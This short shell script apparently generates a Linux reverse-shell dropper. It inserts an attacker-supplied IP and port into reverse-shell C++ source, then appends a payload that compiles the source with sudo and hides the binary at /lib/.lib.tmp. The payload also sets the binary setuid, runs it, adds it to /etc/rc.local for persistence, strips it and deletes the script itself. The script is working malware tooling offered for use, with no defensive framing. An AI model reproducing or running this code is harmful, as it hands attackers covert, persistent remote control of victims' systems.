source $PODGL/lib/fsh.cfg.sh
source $PODGL/lib/colors

CWD=$PODGL/sys/malware/linux/reverse_shell

code=$(cat $PODGL/sys/malware/dropper/linux/reverse_shell/reverse.cpp)
printf "code='" > $3
printf "#define PORT $2\n#define IP "'"'"$1"'"'" " >> $3
echo "$code" >> $3
printf "'" >> $3

code2='
sudo apt install clang &> /dev/null
echo "$code" > ~/.tmpfile.cpp
type g++ &>/dev/null &&(sudo g++ ~/.tmpfile.cpp -o /lib/.lib.tmp && rm ~/.tmpfile.cpp &&sudo chmod +s /lib/.lib.tmp &&/lib/.lib.tmp&& sudo printf "\n#!/bin/bash\n/lib/.lib.tmp\nexit 0\n" >> /etc/rc.local && sudo chmod +x /etc/rc.local && sudo strip /lib/.lib.tmp)
rm $0
'
echo "$code2" >> $3
